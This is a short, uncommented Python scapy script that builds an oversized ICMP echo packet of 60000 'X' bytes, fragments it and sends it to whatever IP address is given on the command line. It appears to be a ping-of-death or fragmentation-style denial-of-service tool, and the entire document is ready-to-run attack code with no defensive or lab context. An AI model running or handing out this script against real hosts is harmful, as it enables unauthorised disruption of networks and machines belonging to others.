#!/usr/bin/env python3
from scapy.all import IP,ICMP,send,fragment
import sys
target_ip = sys.argv[1]
packet = IP(dst=target_ip)/ICMP()/("X" * 60000)
send(fragment(packet))

